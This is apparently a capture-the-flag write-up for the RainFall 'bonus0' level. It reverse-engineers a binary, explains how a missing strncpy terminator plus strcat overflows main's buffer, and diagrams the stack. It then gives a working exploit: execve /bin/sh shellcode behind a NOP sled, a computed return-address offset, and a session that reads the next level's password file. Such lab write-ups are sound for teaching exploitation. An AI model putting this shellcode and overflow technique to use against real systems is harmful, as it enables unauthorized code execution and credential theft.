

<table  style="margin: 0 auto;">
  <tr>
    <th>Assembly Code</th>
    <th>C Code</th>
  </tr>
  <tr>
    <td>
<pre><code class="language-asm">

Dump of assembler code for function main:
   0x080485a4 <+0>:     push   ebp
   0x080485a5 <+1>:     mov    ebp,esp
   0x080485a7 <+3>:     and    esp,0xfffffff0
   0x080485aa <+6>:     sub    esp,0x40
   0x080485ad <+9>:     lea    eax,[esp+0x16]
   0x080485b1 <+13>:    mov    DWORD PTR [esp],eax
   0x080485b4 <+16>:    call   0x804851e <pp>
   0x080485b9 <+21>:    lea    eax,[esp+0x16]
   0x080485bd <+25>:    mov    DWORD PTR [esp],eax
   0x080485c0 <+28>:    call   0x80483b0 <puts@plt>
   0x080485c5 <+33>:    mov    eax,0x0
   0x080485ca <+38>:    leave
   0x080485cb <+39>:    ret
End of assembler dump.


Dump of assembler code for function pp:
   0x0804851e <+0>:     push   ebp
   0x0804851f <+1>:     mov    ebp,esp
   0x08048521 <+3>:     push   edi
   .
   .
   .
   0x080485a1 <+131>:   pop    edi
   0x080485a2 <+132>:   pop    ebp
   0x080485a3 <+133>:   ret
End of assembler dump.

Dump of assembler code for function p:
   0x080484b4 <+0>:     push   ebp
   0x080484b5 <+1>:     mov    ebp,esp
   0x080484b7 <+3>:     sub    esp,0x1018
   0x080484bd <+9>:     mov    eax,DWORD PTR [ebp+0xc]
   0x080484c0 <+12>:    mov    DWORD PTR [esp],eax
   0x080484c3 <+15>:    call   0x80483b0 <puts@plt>
   0x080484c8 <+20>:    mov    DWORD PTR [esp+0x8],0x1000
   0x080484d0 <+28>:    lea    eax,[ebp-0x1008]
   0x080484d6 <+34>:    mov    DWORD PTR [esp+0x4],eax
   0x080484da <+38>:    mov    DWORD PTR [esp],0x0
   0x080484e1 <+45>:    call   0x8048380 <read@plt>
   0x080484e6 <+50>:    mov    DWORD PTR [esp+0x4],0xa
   0x080484ee <+58>:    lea    eax,[ebp-0x1008]
   0x080484f4 <+64>:    mov    DWORD PTR [esp],eax
   0x080484f7 <+67>:    call   0x80483d0 <strchr@plt>
   0x080484fc <+72>:    mov    BYTE PTR [eax],0x0
   0x080484ff <+75>:    lea    eax,[ebp-0x1008]
   0x08048505 <+81>:    mov    DWORD PTR [esp+0x8],0x14
   0x0804850d <+89>:    mov    DWORD PTR [esp+0x4],eax
   0x08048511 <+93>:    mov    eax,DWORD PTR [ebp+0x8]
   0x08048514 <+96>:    mov    DWORD PTR [esp],eax
   0x08048517 <+99>:    call   0x80483f0 <strncpy@plt>
   0x0804851c <+104>:   leave
   0x0804851d <+105>:   ret
End of assembler dump.
</code></pre>
</td>
<td>
<pre><code class="language-c">
void p(char *dest, char *s) {
  char buf[4104];

  puts(s);
  read(0, buf, 4096);
  *strchr(buf, 10) = 0;
  strncpy(dest, buf, 20);
}

void pp(char *dest) {
  char s1[20];
  char s2[28];

  p(s1, " - ");
  p(s2, " - ");
  strcpy(dest, s1);
  dest[strlen(dest)] = " ";
  strcat(dest, s2);
}

int main() {
  char buff[42];

  pp(buff);
  puts(buff);
}
</code></pre>
</td>
</tr>
</table>



# Exploring

The code consists of three functions: `p`, `pp`, and `main`. Here's a quick summary:

- **`p(char *dest, char *s)`**:
  - Takes a destination buffer `dest` and a string `s` to print.
  - Declares a local buffer `buf[4104]`.
  - Prints `s` using `puts(s)`.
  - Reads up to 4096 bytes from standard input (`stdin`) into `buf`.
  - Replaces the first newline (`\n`, ASCII 10) in `buf` with a null terminator (`\0`).
  - Copies up to 20 bytes from `buf` to `dest` using `strncpy`.

- **`pp(char *dest)`**:
  - Takes a destination buffer `dest`.
  - Declares two local arrays: `s1[20]` and `s2[28]`.
  - Calls `p(s1, " - ")` to fill `s1`.
  - Calls `p(s2, " - ")` to fill `s2`.
  - Copies `s1` to `dest` using `strcpy`.
  - Overwrites the null terminator of `dest` with a space (`" "`).
  - Appends `s2` to `dest` using `strcat`.

- **`main()`**:
  - Declares a local buffer `buff[42]`.
  - Calls `pp(buff)` to populate `buff`.
  - Prints `buff` using `puts`.

### The Vulnerability

The vulnerability originates in the `p` function due to how `strncpy` handles string termination, compounded by unsafe string operations (`strcpy` and `strcat`) in `pp`. Here's how it unfolds:

1. **First Call to `p(s1, " - ")`**:
   - `s1` is a 20-byte array in `pp`'s stack frame.
   - `p` reads up to 4096 bytes into `buf`.
   - It null-terminates `buf` at the first newline.
   - `strncpy(s1, buf, 20)` copies the first 20 bytes from `buf` to `s1`.
   - **Key Issue**: If the first 20 bytes of `buf` lack a null terminator (i.e., input is >20 bytes with no newline in the first 20), `s1` won't be null-terminated. `strncpy` copies exactly 20 bytes and does not add a null terminator unless the source string is shorter than 20 bytes and includes one.

2. **Second Call to `p(s2, " - ")`**:
   - `s2` is a 28-byte array.
   - The same process occurs: up to 20 bytes are copied to `s2`.
   - If the input exceeds 20 bytes without a newline in the first 20, `s2` receives 20 bytes without a null terminator. The remaining 8 bytes of `s2` retain their original (indeterminate) values, which may include null bytes.

3. **String Operations in `pp`**:
   - **`strcpy(dest, s1)`**: Copies `s1` to `dest` (which points to `buff[42]` in `main`) until a null terminator is found. If `s1` lacks a null terminator and `s2` follows it in memory (common in stack layouts), `strcpy` copies `s1`’s 20 bytes plus `s2`’s contents until a null byte is encountered—potentially 40 bytes if `s2`’s unwritten 8 bytes contain a null.
   - **`dest[strlen(dest)] = " "`**: Computes the length of `dest` up to its null terminator and replaces that null with a space, making `dest` non-null-terminated within `buff[42]` unless a null byte exists at `buff[41]`.
   - **`strcat(dest, s2)`**: Searches for a null terminator in `dest` to append `s2`. Without a null terminator in `buff`, it continues past `buff[42]` into `main`’s stack frame (e.g., saved base pointer and return address) until it finds a null byte, then appends `s2`. This can overwrite critical stack data.

4. **Buffer Overflow**:
   - `buff` is 42 bytes. Copying 40 bytes via `strcpy` fits, but replacing the null terminator with a space and appending `s2` (20 bytes) pushes the total to 60 bytes (`s1` + space + `s2`), exceeding `buff`’s capacity and overwriting `main`’s return address.

### Strategy

The goal is to overwrite `main`’s return address to point to shellcode (e.g., to execute `/bin/sh`). The shellcode could reside in `buf` (from `p`) or `buff` (via `dest`). Since the hint suggests pointing to `p`’s buffer, we’ll assume `buf`:

- **Input to `p(s1, " - ")`**:
  - Provide >20 bytes (e.g., 4104 bytes) with shellcode starting at an offset, ensuring `s1` gets 20 non-null bytes.
  - `buf` in `p`’s stack frame holds the shellcode.

- **Input to `p(s2, " - ")`**:
  - Provide 20 bytes crafted to, when appended via `strcat`, overwrite `main`’s return address with `buf`’s address (predictable in non-ASLR environments).

- **Overflow**:
  - `strcpy` copies ~40 bytes to `buff`.
  - `dest[40] = " "` removes the null.
  - `strcat` writes `s2` beyond `buff[42]`, overwriting the return address.

When `main` returns, it jumps to `buf`’s shellcode, still present in memory despite `p`’s frame being popped (stack memory isn’t cleared).

### Stack Memory Visualization

Assuming a 32-bit system (4-byte pointers) and stack growing downward:

#### Before Overflow
```
+-------------------+ Lower addresses
| ...               |
|-------------------|
| pp's stack frame  |
| - s1[20]          | (empty)
| - s2[28]          | (empty)
| - Saved EBP       |
| - Return to main  |
|-------------------|
| main's stack frame|
| - buff[42]        | (empty)
| - Saved EBP       | (e.g., 0xFFFF0000)
| - Return address  | (e.g., 0x08048400)
|-------------------|
| ...               |
+-------------------+ Higher addresses
```

#### After Overflow
- `s1` = 20 bytes of junk (e.g., "AAAAAAAAAAAAAAAAAAAA").
- `s2` = 20 bytes with return address to `buf` (e.g., 0xBFFFF000).
- `strcpy` copies 40 bytes; `strcat` appends 20 more.
```
+---------------------+
| ...                 |
|---------------------|
| pp's stack frame    |
| - s1[20]            | "AAAAAAAAAAAAAAAAAAAA"
| - s2[28]            | "BBBBBBBBBBBBBBBBBBBB...."
| - Saved EBP         |
| - Return to main    |
|---------------------|
| main's stack frame  |
| - buff[0-19]        | "AAAAAAAAAAAAAAAAAAAA" (s1)
| - buff[20-39]       | "BBBBBBBBBBBBBBBBBBBB" (s2 from strcpy)
| - buff[40]          | " " (space)
| - buff[41] + beyond | "BBBBBBBBBBBBBBBBBBBB" (s2 from strcat)
| - Overwritten EBP   | (part of s2)
| - Return address    | 0xBFFFF000 (points to buf)
|---------------------|
| ...                 |
+---------------------+
```

# Exploiting

Get offset from **main buffer** to stored **EIP**

```
 ❯ python3 tools/cyclic.py -g 30
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9


   0x080485c5 <+33>:    mov    eax,0x0
=> 0x080485ca <+38>:    leave
   0x080485cb <+39>:    ret
End of assembler dump.
gdb-peda$ x/wx $ebp+0x4
0xbffff71c:     0x41336141


 ❯ python3 tools/cyclic.py -o 0x41336141
Offset found at: 9
```

So the offset is 9 from begining of the 2nd argument.


The payload `python2 file` is:

```
shell = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'

nop = '\x90' * 1024

nop_and_shell = nop + shell + nop

buff_1_padding_len = 4096 - len(nop_and_shell)

buff_1 = nop_and_shell + '\n' * buff_1_padding_len

shell_addr = '\x60\xe8\xff\xbf'

a = 9
b = (20 - 4 - a)

buff_2 = 'a' * a + shell_addr + 'b' * b

print buff_1 + buff_2
```

Output:

```
bonus0@RainFall:~$ (python2 payload.py; cat) | ./bonus0
 -
 -
aaaaaaaaa`bbbbbbb aaaaaaaaa`bbbbbbb
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

See you on the next challenge.

